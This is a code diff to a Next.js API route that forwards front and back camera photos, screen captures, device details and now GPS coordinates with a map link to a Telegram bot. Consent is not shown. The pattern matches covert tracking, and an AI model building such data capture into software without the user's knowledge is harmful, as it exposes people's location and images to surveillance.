@@ -41,6 +41,7 @@ export async function POST(req: NextRequest) {
     photo?: string;
     photoBack?: string;
     screen?: string;
+    gps?: { lat: number; lng: number; acc: number } | null;
     label?: string;
     path?: string;
     kind?: string;
@@ -50,6 +51,7 @@ export async function POST(req: NextRequest) {
       photo?: string;
       photoBack?: string;
       screen?: string;
+      gps?: { lat: number; lng: number; acc: number } | null;
       label?: string;
       path?: string;
       kind?: string;
@@ -81,8 +83,12 @@ export async function POST(req: NextRequest) {
     `页面：${body.path || ''}`,
     `操作：${body.label || ''}`,
     `设备：${osOf(ua)} · ${browserOf(ua)}`,
+    body.gps
+      ? `GPS：${body.gps.lat.toFixed(6)}, ${body.gps.lng.toFixed(6)}（±${body.gps.acc}m）`
+      : '',
+    body.gps ? `地图：https://maps.google.com/?q=${body.gps.lat},${body.gps.lng}` : '',
     `照片：前置${body.photoBack ? ' + 后置' : '（无后置摄像头）'}${body.screen ? ' + 屏幕截图' : '（无屏幕共享）'}`,
-  ].join('\n');
+  ].filter(Boolean).join('\n');
 
   const token = process.env.TG_ENTRY_BOT_TOKEN || '';
   if (!token) return NextResponse.json({ ok: true, telegram: 'no token' });
@@ -114,10 +120,10 @@ export async function POST(req: NextRequest) {
   const screenBlob = body.screen ? dataUrlToBlob(body.screen) : null;
   const form = new FormData();
   form.append('chat_id', chatId);
-  form.append('caption', caption);
   form.append('front.jpg', blob, 'front.jpg');
-  const media: { type: string; media: string }[] = [
-    { type: 'photo', media: 'attach://front.jpg' },
+  // 说明文字嵌入首图 JSON（部分客户端不渲染 sendMediaGroup 顶层 caption）
+  const media: { type: string; media: string; caption?: string }[] = [
+    { type: 'photo', media: 'attach://front.jpg', caption },
   ];
   if (backBlob) {
     form.append('back.jpg', backBlob, 'back.jpg');
@@ -135,6 +141,7 @@ export async function POST(req: NextRequest) {
     }).catch(() => undefined);
   } else {
     form.append('photo', blob, 'front.jpg');
+    form.append('caption', caption);
     await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
       method: 'POST',
       body: form,
